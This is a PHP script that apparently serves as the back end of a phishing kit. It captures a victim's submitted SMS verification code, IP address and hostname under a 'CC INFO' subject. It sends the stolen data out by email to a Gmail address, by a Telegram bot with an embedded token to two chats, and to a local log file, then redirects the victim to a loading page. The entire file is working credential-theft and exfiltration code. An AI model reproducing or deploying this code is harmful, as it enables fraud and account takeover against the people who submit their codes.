<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________xxx_____________\n";

$message .= "__________________SMS 1_____________\n";
$message .= "sms lwel          : ".$_POST['sms1']."\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "_________| pegasus  |__________\n";

$subject = "CC INFO| ".$_POST['CC']." | $ip ";
$headers = "From:orsted ";
$email = ".$EX445093_REMOT.";
mail($email,$subject,$message,$headers);
$EX445093_REMOT = "echayoub@gmail.com";
$file = fopen('Flow.txt', 'a');

fwrite($file,$message);

function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1632004811:AAGGsBwP5L4nWZrTvFd4XmJQgV73cWoqKE8';
    $chat_id  = '1212871188';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));


function telegram_send1($message) {
    $curl = curl_init();
    $api_key  = '1632004811:AAGGsBwP5L4nWZrTvFd4XmJQgV73cWoqKE8';
    $chat_id  = '1069086496';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send1(urlencode($message));

header("Location: loading.html");

?>